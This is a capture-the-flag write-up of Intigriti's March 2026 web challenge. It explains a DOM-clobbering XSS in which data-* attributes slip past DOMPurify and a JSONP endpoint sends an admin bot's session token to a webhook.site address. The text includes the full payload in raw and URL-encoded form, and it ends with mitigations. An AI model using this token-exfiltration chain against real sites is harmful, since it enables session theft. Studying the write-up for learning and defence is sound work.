# Intigriti Monthly Challenge — March 2026 (0326)

**Challenge URL:** https://challenge-0326.intigriti.io/challenge.html?q=  
**Platform:** Intigriti  
**Category:** Web Exploitation  
**Difficulty:** Medium / Tier 2  
**Date:** March 2026  

---

## 🧩 Summary

A DOM-Based Cross-Site Scripting vulnerability in a search application. The `q` parameter is sanitized via **DOMPurify v3.0.6**, but the sanitization config only strips `id`, `class`, and `style` attributes — leaving `data-*` attributes completely untouched.

Because the sanitized output is injected via `innerHTML` and `ComponentManager` initializes **after** insertion, an attacker can use **DOM clobbering** combined with crafted `data-*` attributes to hijack the application's authentication configuration. This redirects the auth flow to an attacker-controlled endpoint, exfiltrating the admin's session token.

---

## 🔍 Walkthrough

### Step 1 — Initial Reconnaissance

The application presents a simple search interface accepting user input through the `q` parameter, and a **"Report URL"** feature that sends a URL to an admin bot.

A quick test confirmed the admin bot visits arbitrary URLs:

```
POST /report  PARAM: https://webhook.site/<ID>
```

The bot visited the webhook successfully — but without any flag attached. This confirms the bot is active and we need a payload that executes in the context of the admin's authenticated session.

---

### Step 2 — Source Code Analysis

Inspecting the page source revealed two important findings:

#### Content Security Policy

The CSP is strict and does not allow scripts or resources from external origins — ruling out any external script injection.

#### JavaScript Files

Three JS files are loaded, all marked as important in the source comments:
- `/js/components.js`
- `/js/main.js`
- (third supporting file)

---

### Step 3 — Analyzing the JavaScript Files

#### `/js/components.js`

Two key functionalities:

**`Auth.loginRedirect`** — Reads configuration from a form element named `authConfig` in the DOM. It retrieves the redirect URL from `config.dataset.next` and checks `config.dataset.append` to determine whether to include the token in the redirect. If no `authConfig` form exists, it falls back to defaults (the homepage).

**`ComponentManager`** — Scans the DOM for elements with `data-component="true"`, reads their `data-config` attribute (parsed as JSON), and dynamically creates `<script>` elements from the configured path. Crucially, **this runs after `innerHTML` insertion**.

#### `/js/main.js`

- The search functionality is entirely cosmetic — it always returns a "no results" response with no real query.
- The `q` parameter is sanitized with DOMPurify, but **only** `id`, `class`, and `style` are stripped. **`data-*` attributes are not sanitized.**
- After sanitization, content is inserted via `innerHTML`.
- `ComponentManager` is called after insertion — meaning injected elements with `data-component` are processed as legitimate components.

---

### Step 4 — Confirming HTML Injection

A simple test confirmed injection is possible through the `q` parameter:

```
?q=<b>THIS</b><u>IS</u><s>VULNERABLE</s>
```

The injected HTML rendered correctly, confirming the DOM clobbering path is viable.

---

### Step 5 — Endpoint Discovery

Since the CSP blocks external script loading, an internal endpoint was needed. Fuzzing with `ffuf` and `feroxbuster` against the `/api/` directory revealed:

```
/api/stats
```

Testing in Burp Suite confirmed this endpoint accepts a `callback` parameter and returns a **JSONP-style response** — wrapping its output in whichever function name is passed. An internal callback test confirmed it can invoke application functions directly, including `Auth.loginRedirect`.

This is the missing piece: `/api/stats` can be used as a JSONP loader to trigger `Auth.loginRedirect` with our injected configuration.

---

### Step 6 — Building the Payload

The final payload combines **DOM clobbering** with **`data-*` attribute injection**:

```html
<form name="authConfig" data-next="https://webhook.site/<ID>" data-append="true"></form>
<div data-component="true" data-config='{"path":"/api/stats?callback=Auth.loginRedirect&x=","type":""}'></div>
```

| Fragment | Purpose |
|---|---|
| `<form name="authConfig"` | DOM clobbers the auth config lookup — `components.js` reads our form instead of the legitimate one |
| `data-next="https://webhook.site/..."` | Sets the post-auth redirect URL to our webhook |
| `data-append="true"` | Ensures the session token/flag is appended to the redirect request |
| `<div data-component="true"` | Signals to `ComponentManager` that this element should be processed as a component |
| `data-config='{"path":"/api/stats?callback=Auth.loginRedirect&x=","type":""}'` | Instructs `ComponentManager` to load `/api/stats` with `Auth.loginRedirect` as the JSONP callback. The `&x=` absorbs the `.js` extension that `ComponentManager` appends automatically |

---

### Step 7 — Testing and Final Adjustments

A local test confirmed the payload works against our own session.

When submitting to the admin bot, the initial attempt with `domain=internal` did not trigger. Switching to `domain=external` and ensuring the full payload was URL-encoded resolved the issue:

```
https://challenge-0326.intigriti.io/challenge.html?q=%3Cform%20name%3D%22authConfig%22%20data-next%3D%22https%3A%2F%2Fwebhook.site%2F<ID>%22%20data-append%3D%22true%22%3E%3C%2Fform%3E%3Cdiv%20data-component%3D%22true%22%20data-config%3D%27%7B%22path%22%3A%22%2Fapi%2Fstats%3Fcallback%3DAuth.loginRedirect%26x%3D%22%2C%22type%22%3A%22%22%7D%27%3E%3C%2Fdiv%3E&domain=external
```

The admin bot visited the crafted URL, the payload executed, and the flag was exfiltrated to the webhook. ✅

---

## 🏁 Final Payload

```html
<form name="authConfig" data-next="https://webhook.site/<YOUR-ID>" data-append="true"></form>
<div data-component="true" data-config='{"path":"/api/stats?callback=Auth.loginRedirect&x=","type":""}'></div>
```

URL-encoded for delivery:
```
https://challenge-0326.intigriti.io/challenge.html?q=<URL-ENCODED-PAYLOAD>&domain=external
```

---

## 🛡️ Vulnerability Breakdown

| Component | Issue |
|---|---|
| DOMPurify config | Only strips `id`, `class`, `style` — `data-*` attributes pass through unsanitized |
| `ComponentManager` | Processes injected `data-component` elements as legitimate app components after `innerHTML` insertion |
| `Auth.loginRedirect` | Reads auth config from DOM — susceptible to DOM clobbering via a named `<form>` |
| `/api/stats` | Unsanitized `callback` parameter allows arbitrary function invocation via JSONP |

---

## 🔧 Recommended Mitigations

- **Sanitize `data-*` attributes:** Extend the DOMPurify config to strip or whitelist `data-*` attributes. At minimum, `data-component`, `data-config`, `data-next`, and `data-append` should be blocked in user-controlled input.
- **Initialize components before `innerHTML`:** `ComponentManager` should not process elements injected via user input. Consider initializing before rendering user content, or restricting initialization to a trusted DOM subtree.
- **Restrict the JSONP callback on `/api/stats`:** Enforce a strict allowlist of permitted callback function names, or migrate to a CORS-based API.
- **Separate user content from the application DOM:** Render user-supplied HTML inside a sandboxed container (e.g. shadow DOM or `<iframe>`) to prevent DOM clobbering of application-level elements like `authConfig`.